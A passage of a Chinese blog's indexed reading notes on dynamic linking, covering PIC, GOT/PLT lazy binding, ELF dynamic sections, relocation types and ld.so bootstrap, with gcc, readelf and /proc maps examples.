对PE文件中的所有导入符号进行解析 根据PE头指定的参数，建立初始化堆栈 建立主线程并启动线程 PE文件中，与装载有关的信息都在PE扩展头和段表。以下是其中的几个和装载相关的成员： 成员 含义 Image Base PE文件的优先装载地址 AddressOfEntryPoint PE装载器准备运行的PE文件的第一个指令的RVA SectionAlignment 内存中段对齐的粒度，默认情况下是系统页的大小 FileAlignment 文件中段对齐的粒度，值是2的指数倍 MajorSubsystem Versio; MinorSubsystem Version 系统运行所需要的Win32子系统版本 SizeOfImage 内存中整个PE映像的尺寸 SizeOfHeaders 所有头+节表的大小，也等于文件尺寸-文件中所有节的尺寸，可以用此值作为PE文件第一节的文件偏移量 Subsystem NT用来是被PE文件属于哪个子系统 SizeOfCode 代码段的长度 SizeOfInitializedData 初始化了的数据段长度 SizeOfUninitializedData 未初始化了的数据段长度 BaseOfCode 代码段起始RVA BaseOfData 数据段起始RVA 动态链接 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:6:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"为什么需要动态链接 静态链接占用内存和磁盘空间，后期模块更新维护困难。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:7:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"动态链接 在程序运行时才进行链接，把链接的过程推迟到运行时进行，这就是动态链接的思想。 假设有A、B两个程序，它们都用了C这个模块。运行A的时候，系统发现了A用到了C，即A依赖于C，那么系统就要加载C，若是A或C还依赖于其他目标文件，系统会把它们全部载入内存，直到依赖关系满足。系统随后开始链接工作，该工作原理和静态链接相似。之后系统控制权交给A的程序入口，程序开始运行。这时运行B，系统只需要加载B，因为内存已经存在C的副本，系统只需要将它俩链接起来即可。 动态链接涉及运行时的链接及多个文件的装载，必须要有操作系统的支持。因为动态链接的情况下，进程的虚拟地址空间的分布比静态链接更为复杂，还有一些存储管理、内存共享、进程线程等机制在动态链接下也有一些微妙的变化。 Linux中，ELF动态链接文件被称为动态共享对象（DSO，Dynamic Shared Objects），简称共享对象，以.so为后缀。Windows系统中，动态链接文件被称为动态链接库（Dynamic Linking Liabray）以.dll为后缀。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:7:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"Linux下动态链接的简单例子 以下面四个代码为例： /* program1.c */ #include \"Lib.h\" int main(){ foobar(1); return 0; } /* program2.c */ #include \"Lib.h\" int main(){ foobar(2); return 0; } /* Lib.c */ #include \u003cstdio.h\u003e void foobar(int i){ printf(\"Printing from lib.so, Program%d\\n\", i); } /* Lib.h */ #ifndef LTB_H #define LTB_H void foobar(int i); #endif 使用GCC将Lib.c编译成一个共享目标文件： $ gcc -fPIC -shared -o Lib.so Lib.c -shared表示生成共享对象。之后分别编译链接Progarm.c和Program2.c $ gcc -o program1 program1.c ./Lib.so $ gcc -o program2 program2.c ./Lib.so 按照静态链接，program1链接的时候应该有Lib.o参与，但这里是Lib.so。 链接器在将program1.o链接成可执行文件时，这时候链接器需要确定foobar()函数的性质，如果它是定义在静态目标模块中的，就走静态链接的流程，如果这是动态共享对象的函数，编译器就会将这个符号的引用标记为一个动态链接的符号不对其进行重定位，这个工作留在装载时进行。 Lib.so保存了完整的符号信息，链接器解析符号时就可以知道foobar()是个定义在Lib.so的动态符号，这样链接器可以对foobar()进行特殊的处理。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:8:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"动态链接程序运行时地址空间分布 查看program1进程的虚拟地址空间分布，可以在foobar()函数中加一个sleep()函数 $ ./program1 \u0026 Printing from lib.so, Program1 $ ps PID TTY TIME CMD 1045 pts/1 00:00:00 fish 1702 pts/1 00:00:00 program1 1708 pts/1 00:00:00 ps $ cat /proc/1702/maps 55f59eb69000-55f59eb6a000 r--p 00000000 00:17 144512 /home/suoyuan/test/program1 55f59eb6a000-55f59eb6b000 r-xp 00001000 00:17 144512 /home/suoyuan/test/program1 55f59eb6b000-55f59eb6c000 r--p 00002000 00:17 144512 /home/suoyuan/test/program1 55f59eb6c000-55f59eb6d000 r--p 00002000 00:17 144512 /home/suoyuan/test/program1 55f59eb6d000-55f59eb6e000 rw-p 00003000 00:17 144512 /home/suoyuan/test/program1 55f5a006d000-55f5a008e000 rw-p 00000000 00:00 0 [heap] 7fcce1ff9000-7fcce1ffc000 rw-p 00000000 00:00 0 7fcce1ffc000-7fcce201e000 r--p 00000000 00:17 4066 /usr/lib/libc.so.6 7fcce201e000-7fcce2179000 r-xp 00022000 00:17 4066 /usr/lib/libc.so.6 7fcce2179000-7fcce21d0000 r--p 0017d000 00:17 4066 /usr/lib/libc.so.6 7fcce21d0000-7fcce21d4000 r--p 001d4000 00:17 4066 /usr/lib/libc.so.6 7fcce21d4000-7fcce21d6000 rw-p 001d8000 00:17 4066 /usr/lib/libc.so.6 7fcce21d6000-7fcce21e3000 rw-p 00000000 00:00 0 7fcce21ff000-7fcce2200000 r--p 00000000 00:17 144511 /home/suoyuan/test/Lib.so 7fcce2200000-7fcce2201000 r-xp 00001000 00:17 144511 /home/suoyuan/test/Lib.so 7fcce2201000-7fcce2202000 r--p 00002000 00:17 144511 /home/suoyuan/test/Lib.so 7fcce2202000-7fcce2203000 r--p 00002000 00:17 144511 /home/suoyuan/test/Lib.so 7fcce2203000-7fcce2204000 rw-p 00003000 00:17 144511 /home/suoyuan/test/Lib.so 7fcce2204000-7fcce2206000 rw-p 00000000 00:00 0 7fcce2206000-7fcce2207000 r--p 00000000 00:17 4057 /usr/lib/ld-linux-x86-64.so.2 7fcce2207000-7fcce222e000 r-xp 00001000 00:17 4057 /usr/lib/ld-linux-x86-64.so.2 7fcce222e000-7fcce2238000 r--p 00028000 00:17 4057 /usr/lib/ld-linux-x86-64.so.2 7fcce2238000-7fcce223a000 r--p 00032000 00:17 4057 /usr/lib/ld-linux-x86-64.so.2 7fcce223a000-7fcce223c000 rw-p 00034000 00:17 4057 /usr/lib/ld-linux-x86-64.so.2 7ffeccce6000-7ffeccd07000 rw-p 00000000 00:00 0 [stack] 7ffeccd1a000-7ffeccd1e000 r--p 00000000 00:00 0 [vvar] 7ffeccd1e000-7ffeccd20000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall] 可以发现Lib.so和Program1一样，它们都被操作系统以同样的方法映射到进程的虚拟地址空间。除了Lib.so之外，Program1还用到了动态链接形式的C语言你运行库libc.so.6。另外还有一个共享对象就是ld-linux-x86-64.so.2，这实际上是Linux下的动态链接器。动态链接器和普通共享对象一样被映射到进程的地址空间，在系统开始运行program1之前会先将控制权交给动态链接器，由它完成所有的动态链接工作以后再把控制权交给program1，然后开始执行。 共享对象的最终装载地址在编译时是不确定的，使用readelf -l查看其segment可以发现其装载地址从0开始。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:8:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"地址无关代码 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:9:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"固定装载地址的困扰 为模块手工写死地址十分困难，静态共享库解决了这个问题，但是也仅仅是把分配地址的权利交给了操作系统，仍然是写死的。如今静态共享库已经被淘汰了。为了解决这个问题，共享对象在编译时不能假设自己在进程虚拟地址空间的位置。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:9:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"装载时重定位 把重定位的过程推到装载时执行，对这些地址进行修正。之前静态链接的重定位叫做链接时重定位（Link Time Relocation），现在这个情况是装载时重定位（Load Time Relocation），Windows中这种重定位也叫基址重置（Rebasing） 动态链接模块被装载映射到虚拟空间后，指令部分在多个进程直接共享，由于装载时重定位的方法需要修改指令，所以无法做到同一份指令被多个进程共享。动态链接库中的可修改数据部分对于不同的进程来说有多个副本，所以它们可以采用装载时重定位的方法解决。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:9:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"地址无关代码 虽然装载时重定位解决了绝对地址引用的位，但是失去了动态链接节省内存的优势。 程序模块中共享的指令部分在装载时不需要因为装载地址的改变而改变，所以实现的基本想法就是把指令中那些需要需要修改的部分分离出来，跟数据部分放在一起这样指令部分就可以保持不变，而数据部分可以在每个进程中拥有一个副本。这种方案就是目前被称地址无关代码（PIC，Position-independent Code）的技术。 这里把共享目标模块中的地址引用按照是否跨模块分为内部引用和外部引用，根据引用方式分为指令引用和数据访问，这样就得到了四种情况： 模块内部的函数调用、调转等 模块内部的数据访问，比如定义在模块中的全局变量、静态变量 模块外部的函数调用、调转等 模块外部的数据访问，比如定义在其他模块中的全局变量 模块内的函数调用、调转 模块内部的调转、函数调用都可以是相对地址调用，这种指令不需要重定位。 模块内的数据访问 使用的相对寻址。ELF获取当前指令地址（PC）的值，再加上一条偏移量即可。 模块间的数据访问 这种其他模块的全局变量的地址跟装载地址有关，ELF的做法是在数据段里面建立一个指向这些变量的指针数组，被称为全局偏移表（Global Offset Table），当代码需要引用全局变量时可以通过GOT中相对应的项间接引用。 指令要访问这种变量的时候，程序首先找到GOT，根据GOT中变量对应的项找到变量的目标地址。每个变量都对应一个4字节的地址，链接器在装载模块的时候会查找每个变量所在的地址，然后填充GOT中的各个项，确保每个指针指向的地址正确。由于GOT本身放在数据段，可以再模块装载时被修改，并且每个进程都可以有独立的副本，相互不受影响。 模块间的函数调用、跳转 采用上述方法解决，不同的是GOT存放目标函数的地址 -fpic和-fPIC： 这两个GCC的参数都用来生成地址无关代码，区别在于大写的产生的代码也要大，但是对硬件平台的适应能力强于小写的。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:9:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"共享模块的全局变量 如果一个模块引用了一个定义在共享对象的全局变量的时候，编译器无法根据上下文判断这个全局变量是定义在同一个模块的其他目标文件还是定义在另一个共享模块中，即无法判断是否是跨模块的调用。所以默认把定义在模块内部的全局变量当作跨模块的情况处理，也就是通过GOT实现变量的访问。 当共享模块被装载时，如果某个全局变量在可执行文件中拥有副本，动态链接器就会把GOT中的相对地址指向该副本，如果变量在共享模块中被初始化，动态链接器还需要把初始化值复制到程序主模块中的变量副本，如果该全局变量在程序主模块中没有副本，GOT的相对地址就指向模块内部的该变量副本 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:9:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"延迟绑定 (PLT) 为了提升动态链接的性能 基本实现 基本思想就是当函数第一次被用到时才绑定，进行符号查找和重定位的工作，没用到就不绑定。ELF用PLT（Procedure Linkage Table）的方法实现。 调用某个外部模块的函数时，正常方法是通过GOT中相应的项进行间接跳转。PLT为了实现延迟绑定，在这个过程中间增加了一层间接跳转。调用函数并不直接通过GOT跳转，而是通过PLT来进行跳转。所有外部函数在PLT中都有一个相应的项，假设bar()函数在PLT中项的地址称为bar@plt，下面是它的实现： bar@plt: jmp *(bar@GOT) push n jump find_from_got 第一条指令是通过GOT间接跳转，bar@GOT表示GOT中保存bar()函数相对应的项，如果链接器初始化该项就会跳转去调用函数。为了实现延迟绑定，初始化并没有把地址填进去。第二条指令将n压栈，这个数字是bar符号引用在重定位表.rel.plt中的下标，然后跳转到find_from_got，其进行一系列工作就会将bar()真正的地址填入bar@GOT中，再次调用即可跳转。 这种函数一旦被解析完毕，第一条的jmp指令就可以调转到真正的bar()函数找那个，函数返回时根据堆栈保存的EIP的值直接返回调用者，而不需要执行bar@plt()中的代码，这段代码只会在符号未解析的时候调用一次。 上面描述的是基本原理，现实中PLT的实现要稍复杂一些。GOT被拆分成了.got和.got.plt两个表，.got存放全局变量引用的地址，.got.plt保存函数引用的地址。实际上的PLT的结构也与上述的PLT有所不同。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:10:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"动态链接相关结构 Linux系统下，动态链接器ld.so就是一个共享对象，操作系统同样可以通过映射的方式将它加载到进程的地址空间中。操作系统完成加载动态链接器后就会将控制权交给动态链接器的入口地址，得到控制权后再执行一系列自身的初始化操作，根据当前的环境参数开始对可执行文件进行动态链接工作，当所有的动态链接工作完成之后，动态链接器会将控制权交给可执行文件的入口地址，程序开始正式执行。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:11:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":".interp段 .interp的内容就是一个字符串，这个字符串就是动态链接器所在的路径。 使用objdump可以查看该路径 $ objdump -s hello hello: file format elf64-x86-64 Contents of section .interp: 0318 2f6c6962 36342f6c 642d6c69 6e75782d /lib64/ld-linux- 0328 7838362d 36342e73 6f2e3200 x86-64.so.2. ... ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:11:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":".dynamic段 这是动态链接ELF中最重要的结构，这个段保存了动态链接器所需要的基本信息，比如以来哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。 typedef struct { Elf64_Sxword d_tag; /* Dynamic entry type */ union { Elf64_Xword d_val; /* Integer value */ Elf64_Addr d_ptr; /* Address value */ } d_un; } Elf64_Dyn; 下面列举几个d_tag常见的值，全部定义在elf.h文件中，就在Elf64_Dyn的定义下面。 d_tag类型 d_un含义 DT_SYMTAB 动态链接符号表的地址，d_ptr表示.dynsym的地址 DT_STRTAB 动态链接字符串表的地址，d_ptr表示.dynstr的地址 DT_STRSZ 动态链接字符串表大小，d_val表示大小 DT_HASH 动态链接哈希表地址，d_ptr表示.hash地址 DT_SONAME 本共享文件的SO-NAME DT_RPATH 动态链接共享对象搜索路径 DT_INIT 初始化代码地址 DT_FINT 结束代码地址 DT_NEED 依赖的共享目标文件，d_ptr表示所依赖的共享目标文件名 DT_REL DT_RELA 动态链接重定位表地址 DT_RELENT DT_RELAENT 动态重读位表入口数量 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:11:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"动态符号表 完成动态链接的关在在于所依赖的符号和相关文件的信息。静态链接中，有一个专门的段叫符号表.symtab，里面保存了所有关于该目标文件的符号的定义和引用。动态链接和静态链接相似，比如前面例子中program1依赖于Lib.so，引用了里面的foobar()函数，对于program1来说，program1导入了foobar()函数，foobar()就是它的导入函数，对于Lib.so来说，它定义了foobar()函数并提供给其他模块使用，foobar()就是它的导出函数。 为了表示动态链接这些诶模块之间的导入导出关系，ELF专门有一个叫做动态符号表 (Dynamic Symbol Table)的段用来保存这些信息，这个段的段名通常叫做.dynsym 。与.symtab不同的是，dynsym只保存了动态链接相关的符号，对于模块内部的符号（比如模块的私有变量）。很多时候动态链接的模块通识拥有.dynsym和.symtab两个表，后者往往保存了所有符号，包括.dynsym中的符号。 和.symtab类似，动态符号表也需要一些辅助的表，比如用来保存符号名的字符串表。静态链接时叫符号字符串表.strtab，这里就是动态符号字符串表.dynstr (Synamic String Tab)；为了加快程序运行时查找符号的过程，往往该还有辅助的符号哈希表.hash可以用readelf查看ELF文件的动态符号表和哈希表。 $ readelf -sD Lib.so Symbol table for image contains 8 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 3: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 4: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND sleep@GLIBC_2.2.5 (2) 6: 0000000000000000 0 FUNC WEAK DEFAULT UND [...]@GLIBC_2.2.5 (2) 7: 0000000000001119 54 FUNC GLOBAL DEFAULT 12 foobar ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:11:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"动态链接重定位表 共享对象需要重定位的主要原因是导入符号的存在。动态链接下，无论是可执行文件或共享对象，一旦其依赖于其他共享对象，就会存在对导入符号的引用。编译时这些导入符号的地址未知。静态链接中，这些未知的地址引用在最终链接时被修正。在动态链接中，导入符号的地址在运行时才能确定，所以需要运行时将这些导入符号的引用修正，即需要重定位。 动态链接下，如果一个共享对象不是以PIC模式编译的，毫无疑问需要重定位；如果其是PIC模式编译，事实上也需要重定位。 对于使用PIC技术的可执行文件或共享对象来说，虽然代码段不需要重定位（因为与地址无关），但是数据段还包含了绝对地址的引用，因为代码段中绝对地址相关的部分被分离了出来，变成GOT，而GOT实际上是数据段的一部分。除了GOT外，数据段还可能包含绝对地址引用。 动态链接重定位相关结构 共享对象的重定位与前面静态链接中的目标文件的重定位十分类似，唯一的区别在于目标文件的重定位在静态链接时完成，而共享对象的重定位在装载时完成。在静态链接中，目标文件里面包含有专门用于表示重定位信息的重定位表（.rel.text、.rel.data） 动态链接的文件中，也有类似的重定位表分别叫做.rel.dyn和.rel.plt，分别相当于静态链接的.rel.text和.rel.data。rel.dyn实际上时对数据引用的修正，它所修正的位置位于.got以及数据段，而.rel.plt时对函数引用的修正，它修正的位置位于.got.plt。可以使用readelf查看一个动态链接的文件的重定位表 $ readelf -r Lib.so Relocation section '.rela.dyn' at offset 0x498 contains 7 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000003df8 000000000008 R_X86_64_RELATIVE 1110 000000003e00 000000000008 R_X86_64_RELATIVE 10c0 000000004010 000000000008 R_X86_64_RELATIVE 4010 000000003fc8 000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0 000000003fd0 000300000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000003fd8 000400000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0 000000003fe0 000600000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0 Relocation section '.rela.plt' at offset 0x540 contains 2 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000004000 000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0 000000004008 000500000007 R_X86_64_JUMP_SLO 0000000000000000 sleep@GLIBC_2.2.5 + 0 $ readelf -S Lib.so ... [20] .got PROGBITS 0000000000003fc8 00002fc8 0000000000000020 0000000000000008 WA 0 0 8 [21] .got.plt PROGBITS 0000000000003fe8 00002fe8 0000000000000028 0000000000000008 WA 0 0 8 ... 之前在静态链接的指令修正介绍了R_X86_64_PC32和R_X86_64_PLT32。这里可以看到一些新的类型：R_X86_64_RELATIVE、R_X86_64_GLOB_DAT和R_X86_64_JUMP_SLO。 这里可以看到printf()函数的重定位入口类型是R_X86_64_JUMP_SLO，它的偏移是000000004000，实际上位于.got.plt中。.got.plt的前三项被系统占据，从第四项开始才是真正存放数据。第四项就是0000000000003fe8 + 3 * 8 = 000000004000，即printf()，第五项就是sleep()。 动态链接器进行重定位时，它先查找printf()的地址，printf位于libc.so.6，地址找到后就会将地址填到.got.plt中的偏移为000000004000的位置上，从而实现了地址的重定位。 R_X86_64_GLOB_DAT是对.got的重定位，它和R_X86_64_JUMP_SLO相似。 R_X86_64_RELATIVE这种类型的重定位实际上是基址重置。共享对象的数据段无法做到地址无关，所以必须在装载时将其重定位。对于下面这样的代码 static int a; static int* p = \u0026a; 在编译时，共享对象的地址从0开始，假设静态变量a相对于起始地址的偏移时A，即p的值时A。一旦共享对象被装载到地址B，那么实际上该变量的地址就要变成A+B，p的值也得跟着变。R_X86_64_RELATIVE类型的重定位入口就是用来重定位p变量这种类型的，变量在装载时需要加上一个装载地址才是正确的结果。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:11:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"动态链接时进程堆栈初始化信息 从动态链接器的角度来看，当操作系统把控制权交给它的时候，它将开始做链接工作，那么它至少需要知道关于可执行文件和本进程的一些信息，比如可执行文件的segment，程序的入口地址等等。这些信息往往由操作系统传递给动态链接器，保存在进程的堆栈里面。堆栈保存动态链接器所需的辅助信息数组，其在elf.h中有定义 typedef struct { uint64_t a_type; /* Entry type */ union { uint64_t a_val; /* Integer value */ /* We use to have pointer elements added here. We cannot do that, though, since it does not work when using 32-bit definitions on 64-bit platforms and vice versa. */ } a_un; } Elf64_auxv_t; a_type定义 a_type值 a_val含义 AT_NULL 0 表示辅助信息数组结束 AT_EXEFD 2 表示可执行文件的文件文件描述符。动态链接器需要知道关于可执行文件的信息，进程执行可执行文件时，操作系统就会把文件打开，这时就会产生文件文件描述符 AT_PHDR 3 可执行文件的程序头表在进程中的地址 AT_PHDR 3 动态链接器可以用AT_EXEFD那样通过操作系统读写文件功能访问可执行文件，但操作系统还可以将可执行文件映射到进程的虚拟地址空间中，动态链接器就可以直接访问内存中的文件映像。所以操作系统要么选择上面的方式，要么选择这种方式。选择这种方式，操作系统必须提供后面的AT_PHENT、AT_PHNUM和AT_ENTRY这几个类型 AT_PHENT 4 可执行文件头中程序头表中每一个入口的大小 AT_PHNUM 5 可执行文件头中程序员表中入口的数量 AT_BASE 7 动态链接器本身的装载地址 AT_ENTRY 9 可执行文件入口地址 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:11:5","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"动态链接的步骤和实现 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:12:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"动态链接器bootstrap 动态链接器是一个特殊的共享对象，本身不依赖于其他任何共享对象，它所需要的全局和静态变量的重定位工作由自身完成。这需要一段精巧的代码在不用到这些变量的情况下完成对于这些变量的重定位，这种启动代码被称为bootstrap。 动态链接器的入口地址就是bootstrap代码的入口。bootstrap代码首先找到自己的GOT。GOT的第一个入口保存的是.dynamic段的偏移地址，由此找到了动态链接器本身的.dynamic段。通过.dynamic中的信息，bootstrap代码可以获得动态链接器本身的重定位表和符号表等，从而得到动态链接器本身的重定位入口，先将它们全部重定位。从这一步开始，动态链接器代码中才可以使用自己的全局变量和静态变量。 实际上动态链接器在bootstrap代码中，除了不可是哟个全局变量和静态变量之外，甚至不能调用函数。使用PIC模式编译的共享对象，对于模块内部的函数调用也是和模块外部函数调用使用一样的方式——GOT/PLT，所以在其没有重定位之前，bootstrap代码不能使用它们。在Glibc源码下elf/rtld.c中有一段注释： /* Now life is sane; we can call functions and access global data. Set up to use the operating system facilities, and find out from the operating system's program loader where to find the program header table in core. Put the rest of _dl_start into a separate function, that way the compiler cannot put accesses to the GOT before ELF_DYNAMIC_RELOCATE. */ 该注释写在bootstrap代码的结尾。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:12:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"装载共享对象 完成bootstrap之后，动态链接器将可执行文件和链接器自身的符号表都合并到一个符号表中，称为全局符号表。之后链接器寻找可执行文件所依赖的共享对象，在.dynamic段中，类型DT_NEEDED所指的就是这个。链接器列出可执行文件所需的共享对象，将它们的名字放到一个集合中，链接器从集合中读取一个名字，找到并打开相应的文件，读取相应的ELF文件头和.dynamic段，然后将它相应的代码段和数据段映射到进程空间。如果ELF共享对象还依赖于其他共享对象，那么将所依赖的共享对象的名字放到集合中。当然链接器可以有不同的装载顺序。 当一个新的共享对象被装载进来时，它的符号表会被合并到全局符号表中。 符号的优先级 //a1.c: #include\u003cstdio.h\u003e void a(){ printf(\"a1.c\\n\"); } //a2.c: #include \u003cstdio.h\u003e void a(){ printf(\"a2.c \\n\"); } //b1.c: void a(); void b1(){ a(): } //b2.c: void a(); void b2(){ a(); } 这里指定b1.so依赖于a1.so，b2.so依赖于a2.so。 $ gcc -fPIC -shared a1.c -o a1.so $ gcc -fPIC -shared a2.c -o a2.so $ gcc -fPIC -shared b1.c a1.so -o b1.so $ gcc -fPIC -shared b2.c a2.so -o b2.so 这时候如果程序使用了b1()函数和b2()函数 #include \u003cstdio.h\u003e void b1(); void b2(); int main(){ b1(); b2(); return 0; } $ gcc main.c b1.so b2.so -o main -Wl,-rpath=$(pwd),--disable-new-dtags $ ./main a1.c a1.c 这里的-Wl用于将后续逗号隔开的选项传给ld链接器 rpath指定链接器在本目录寻找共享对象，否则链接器会报出a1.so和b2.so不存在的错误 –disable-new-dtags，表示启用RPATH而不是RUNPATH，RUNPATH无法在装载a1.so和a2.so的时候也搜索这个路径，通过strace可以验证。当然用户可以手动修改环境变量，那么连RPATH也不用写了。 How to set RPATH and RUNPATH with GCC/LD? export LD_LIBRARY_PATH=.; 在main.c中加个sleep()函数以查看main程序的进程地址空间 $ cat /proc/4329/maps 562581f38000-562581f39000 r--p 00000000 00:17 172029 /home/suoyuan/test/main 562581f39000-562581f3a000 r-xp 00001000 00:17 172029 /home/suoyuan/test/main 562581f3a000-562581f3b000 r--p 00002000 00:17 172029 /home/suoyuan/test/main 562581f3b000-562581f3c000 r--p 00002000 00:17 172029 /home/suoyuan/test/main 562581f3c000-562581f3d000 rw-p 00003000 00:17 172029 /home/suoyuan/test/main 562581fab000-562581fcc000 rw-p 00000000 00:00 0 [heap] 7fd22c779000-7fd22c77b000 rw-p 00000000 00:00 0 7fd22c77b000-7fd22c77c000 r--p 00000000 00:17 171921 /home/suoyuan/test/a2.so 7fd22c77c000-7fd22c77d000 r-xp 00001000 00:17 171921 /home/suoyuan/test/a2.so 7fd22c77d000-7fd22c77e000 r--p 00002000 00:17 171921 /home/suoyuan/test/a2.so 7fd22c77e000-7fd22c77f000 r--p 00002000 00:17 171921 /home/suoyuan/test/a2.so 7fd22c77f000-7fd22c780000 rw-p 00003000 00:17 171921 /home/suoyuan/test/a2.so 7fd22c780000-7fd22c781000 r--p 00000000 00:17 171920 /home/suoyuan/test/a1.so 7fd22c781000-7fd22c782000 r-xp 00001000 00:17 171920 /home/suoyuan/test/a1.so 7fd22c782000-7fd22c783000 r--p 00002000 00:17 171920 /home/suoyuan/test/a1.so 7fd22c783000-7fd22c784000 r--p 00002000 00:17 171920 /home/suoyuan/test/a1.so 7fd22c784000-7fd22c785000 rw-p 00003000 00:17 171920 /home/suoyuan/test/a1.so 7fd22c785000-7fd22c7a7000 r--p 00000000 00:17 4066 /usr/lib/libc.so.6 7fd22c7a7000-7fd22c902000 r-xp 00022000 00:17 4066 /usr/lib/libc.so.6 7fd22c902000-7fd22c959000 r--p 0017d000 00:17 4066 /usr/lib/libc.so.6 7fd22c959000-7fd22c95d000 r--p 001d4000 00:17 4066 /usr/lib/libc.so.6 7fd22c95d000-7fd22c95f000 rw-p 001d8000 00:17 4066 /usr/lib/libc.so.6 7fd22c95f000-7fd22c96c000 rw-p 00000000 00:00 0 7fd22c988000-7fd22c989000 r--p 00000000 00:17 171923 /home/suoyuan/test/b2.so 7fd22c989000-7fd22c98a000 r-xp 00001000 00:17 171923 /home/suoyuan/test/b2.so 7fd22c98a000-7fd22c98b000 r--p 00002000 00:17 171923 /home/suoyuan/test/b2.so 7fd22c98b000-7fd22c98c000 r--p 00002000 00:17 171923 /home/suoyuan/test/b2.so 7fd22c98c000-7fd22c98d000 rw-p 00003000 00:17 171923 /home/suoyuan/test/b2.so 7fd22c98d000-7fd22c98e000 r--p 00000000 00:17 171922 /home/suoyuan/test/b1.so 7fd22c98e000-7fd22c98f000 r-xp 00001000 00:17 171922 /home/suoyuan/test/b1.so 7fd22c98f000-7fd22c990000 r--p 00002000 00:17 171922 /home/suoyuan/test/b1.so 7fd22c990000-7fd22c991000 r--p 00002000 00:17 171922 /home/suoyuan/test/b1.so 7fd22c991000-7fd22c992000 rw-p 00003000 00:17 171922 /home/suoyuan/test/b1.so 7fd22c992000-7fd22c994000 rw-p 00000000 00:00 0 7fd22c994000-7fd22c995000 r--p 00000000 00:17 4057 /usr/lib/ld-linux-x86-64.so.2 7fd22c995000-7fd22c9bc000 r-xp 00001000 00:17 4057 /usr/lib/ld-linux-x86-64.so.2 7fd22c9bc000-7fd22c9c6000 r--p 00028000 00:17 4057 /usr/lib/ld-linux-x86-64.so.2 7fd22c9c6000-7fd22c9c8000 r--p 00032000 00:17 4057 /usr/lib/ld-linux-x86-64.so","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:12:2","tags":["readding notes","compilation 